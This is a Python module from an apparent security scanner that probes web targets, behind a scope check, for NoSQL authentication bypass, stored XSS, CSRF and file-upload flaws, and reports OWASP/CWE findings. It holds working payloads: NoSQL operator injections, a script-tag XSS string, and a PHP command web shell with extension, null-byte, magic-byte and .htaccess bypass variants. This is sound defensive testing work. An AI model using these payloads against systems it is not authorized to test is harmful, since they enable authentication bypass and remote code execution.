"""Scanner for vulnerabilities requiring specific endpoints (not param-based):
NoSQL injection (auth bypass), Stored XSS (write→read), CSRF, Unrestricted File Upload.
"""
from __future__ import annotations

import json

from ...core.http import HttpClient
from ...core.logging import AuditLogger
from ...core.models import Evidence, Finding, Severity, Target
from ...core.scope import ActionClass, ScopeGuard


class AdvancedScanner:
    name = "advanced-scanner (native)"

    def __init__(self, http: HttpClient, log: AuditLogger, guard: ScopeGuard):
        self.http = http
        self.log = log
        self.guard = guard

    def scan(self, target: Target, *, nosql_login: list[str] | None = None,
             stored_xss: list[tuple[str, str, str]] | None = None,
             csrf_forms: list[tuple[str, str]] | None = None,
             upload_paths: list[str] | None = None) -> list[Finding]:
        base = target.url.rstrip("/")
        self.guard.authorize(base, ActionClass.ACTIVE)
        findings: list[Finding] = []
        for ep in (nosql_login or []):
            findings += self._nosqli(base, ep)
        for w, r, field in (stored_xss or []):
            findings += self._stored_xss(base, w, r, field)
        for form, submit in (csrf_forms or []):
            findings += self._csrf(base, form, submit)
        for up in (upload_paths or []):
            findings += self._file_upload(base, up)
        return findings

    def _report(self, out: list[Finding], f: Finding) -> None:
        self.log.finding(f.title, f.severity.value, owasp=f.owasp)
        out.append(f)

    def _nosqli(self, base: str, endpoint: str) -> list[Finding]:
        out: list[Finding] = []
        hdr = {"Content-Type": "application/json"}

        def ok(txt: str) -> bool:
            t = txt.lower().replace(" ", "")
            return '"success":true' in t or '"token"' in t or "welcome" in t or '"role"' in t

        wrong = self.http.post(f"{base}{endpoint}", headers=hdr,
                              content=json.dumps({"username": "admin", "password": "wrong_bz_xyz"}))
        if ok(wrong.text):
            return out  # accepts any password → not a clean signal
        # many NoSQL operator-injection shapes, JSON body AND query-string form
        json_ops = [{"$ne": None}, {"$gt": ""}, {"$gte": ""}, {"$ne": "x"},
                    {"$regex": ".*"}, {"$regex": "^a"}, {"$in": ["admin"]}, {"$exists": True}]
        for op in json_ops:
            inj = self.http.post(f"{base}{endpoint}", headers=hdr,
                                content=json.dumps({"username": "admin", "password": op}))
            if ok(inj.text):
                self.log.action(base, self.name, f"NoSQLi probe {endpoint}")
                self._report(out, Finding(
                    title=f"NoSQL Injection (auth bypass) in {endpoint}",
                    severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-943",
                    target=f"{base}{endpoint}", component=endpoint, source_tool=self.name,
                    description=f"A NoSQL operator ({json.dumps(op)}) in the password field bypasses authentication.",
                    impact="Logging in without knowing the password; access to any account.",
                    recommendation="Validate types (password must be a string); never pass objects into queries.",
                    evidence=Evidence(payload=json.dumps({"username": "admin", "password": op}),
                                      response=inj.text[:200])))
                return out
        # query-string operator injection (?username[$ne]=&password[$ne]=)
        for qs in ["username[$ne]=x&password[$ne]=x", "username[$gt]=&password[$gt]=",
                   "username[$regex]=.*&password[$regex]=.*"]:
            inj = self.http.post(f"{base}{endpoint}",
                                headers={"Content-Type": "application/x-www-form-urlencoded"}, content=qs)
            if ok(inj.text):
                self.log.action(base, self.name, f"NoSQLi query-string probe {endpoint}")
                self._report(out, Finding(
                    title=f"NoSQL Injection (query-string operators) in {endpoint}",
                    severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-943",
                    target=f"{base}{endpoint}", component=endpoint, source_tool=self.name,
                    description=f"Query-string operator injection ({qs}) bypasses authentication.",
                    impact="Authentication bypass without a valid password.",
                    recommendation="Reject bracket/operator params; validate types server-side.",
                    evidence=Evidence(payload=qs, response=inj.text[:200])))
                return out
        return out

    def _stored_xss(self, base: str, write: str, read: str, field: str) -> list[Finding]:
        out: list[Finding] = []
        marker = "bzSTORED9"
        payload = f"<script>{marker}()</script>"
        # try JSON, then form-encoded
        self.http.post(f"{base}{write}", headers={"Content-Type": "application/json"},
                      content=json.dumps({field: payload}))
        self.http.post(f"{base}{write}", headers={"Content-Type": "application/x-www-form-urlencoded"},
                      content=f"{field}={payload}")
        r = self.http.get(f"{base}{read}")
        if payload in r.text:
            self.log.action(base, self.name, f"Stored XSS {write}->{read}")
            self._report(out, Finding(
                title=f"Stored XSS in {read} (field '{field}')",
                severity=Severity.HIGH, owasp="A05:2025 Injection", cwe="CWE-79",
                target=f"{base}{read}", component=f"{write}->{read}", source_tool=self.name,
                description="A payload saved through the form is rendered to other users without encoding.",
                impact="Persistent XSS — JS execution for every visitor (session theft, XSS worm).",
                recommendation="Encode the output when rendering; sanitize input; CSP.",
                reproduction=(f"1. POST {base}{write} with {field}={payload}\n"
                              f"2. Open {base}{read} — the script will execute. Visible PoC: use "
                              f"<script>alert(document.domain)</script>."),
                evidence=Evidence(payload=payload, request=f"POST {write} -> GET {read}",
                                  response=r.text[:200])))
        return out

    def _csrf(self, base: str, form: str, submit: str) -> list[Finding]:
        out: list[Finding] = []
        import re
        r = self.http.get(f"{base}{form}")
        has_token = bool(re.search(r'name=["\']?(csrf|_token|authenticity_token|xsrf)',
                                   r.text, re.IGNORECASE))
        setcookie = r.header("Set-Cookie") or ""
        samesite = "samesite" in setcookie.lower()
        is_post_form = bool(re.search(r"<form[^>]*method=['\"]?post", r.text, re.IGNORECASE))
        if has_token or not is_post_form:
            return out
        # ACTIVE check: submit the state-changing request WITHOUT any token and see if it is accepted.
        # extract the form field names so we send a plausible body.
        fields = {n: "bztest@evil.example" if "mail" in n.lower() else "bztest"
                  for n in re.findall(r'<(?:input|textarea|select)[^>]*name=["\']?([\w\-]+)', r.text)
                  if n.lower() not in {"submit", "button"}}
        body = "&".join(f"{k}={v}" for k, v in fields.items()) or "x=1"
        pr = self.http.post(f"{base}{submit}",
                           headers={"Content-Type": "application/x-www-form-urlencoded"}, content=body)
        low = pr.text.lower()
        blocked = pr.status in (403, 419) or any(w in low for w in ("csrf", "forbidden", "invalid token"))
        accepted = pr.status in (200, 302) and not blocked
        self.log.action(base, self.name, f"CSRF probe {form} -> {submit}")
        sev = Severity.HIGH if accepted else Severity.MEDIUM
        title = (f"CSRF: state-changing action {submit} accepted without a token"
                 if accepted else f"Missing CSRF protection in form {form} (action {submit})")
        self._report(out, Finding(
            title=title, severity=sev, owasp="A01:2025 Broken Access Control", cwe="CWE-352",
            target=f"{base}{submit}", component=form, source_tool=self.name,
            description=("The state-changing request was accepted with NO anti-CSRF token"
                         if accepted else "A state-changing form contains no anti-CSRF token")
                        + ("" if samesite else "; session cookie without the SameSite attribute") + ".",
            impact="An attacker can force the action (e.g. change email) on behalf of a logged-in victim.",
            recommendation="Anti-CSRF token (synchronizer/double-submit) + SameSite=Lax/Strict cookie.",
            reproduction=f"POST {base}{submit} with body `{body}` and NO CSRF token → accepted.",
            evidence=Evidence(payload=body,
                              response=f"token in form: {has_token}; SameSite: {samesite}; "
                                       f"tokenless POST status: {pr.status}")))
        return out

    def _file_upload(self, base: str, endpoint: str) -> list[Finding]:
        out: list[Finding] = []
        php = b"<?php system($_GET['c']); ?>"
        gif = b"GIF89a;\n" + php   # magic-byte prefix to fool content sniffers
        # bypass variants: raw, double-extension, alt PHP exts, content-type spoof, magic bytes, .htaccess, case
        variants = [
            ("shell.php", php, "application/x-php"),
            ("shell.php.jpg", php, "image/jpeg"),
            ("shell.pHp", php, "image/jpeg"),
            ("shell.phtml", php, "application/octet-stream"),
            ("shell.php5", php, "image/png"),
            ("shell.jpg", gif, "image/jpeg"),         # magic-byte + php body
            ("shell.php%00.jpg", php, "image/jpeg"),  # null-byte truncation
            (".htaccess", b"AddType application/x-httpd-php .jpg", "text/plain"),
        ]
        for fname, content, ctype in variants:
            r = self.http.post(f"{base}{endpoint}", files={"file": (fname, content, ctype)})
            low = r.text.lower()
            rejected = any(w in low for w in ("not allowed", "invalid", "rejected", "forbidden", "denied"))
            accepted = r.status in (200, 201) and ("saved" in low or "filename" in low
                                                   or fname.split("%00")[0].lower() in low)
            if accepted and not rejected:
                self.log.action(base, self.name, f"file-upload {endpoint} ({fname})")
                self._report(out, Finding(
                    title=f"Unrestricted / bypassable File Upload in {endpoint}",
                    severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-434",
                    target=f"{base}{endpoint}", component=endpoint, source_tool=self.name,
                    description=f"The server accepted an executable payload as `{fname}` "
                                f"(content-type {ctype}) — insufficient extension/type validation.",
                    impact="Uploading a webshell → remote code execution (RCE).",
                    recommendation="Allowlist extensions/MIME by content, store outside the webroot, "
                                   "random names, no execution in the upload dir, AV scan.",
                    reproduction=f"Upload `{fname}` (php body) to {endpoint} — it is accepted.",
                    evidence=Evidence(payload=f"{fname} ({ctype})", response=r.text[:200])))
                break
        return out
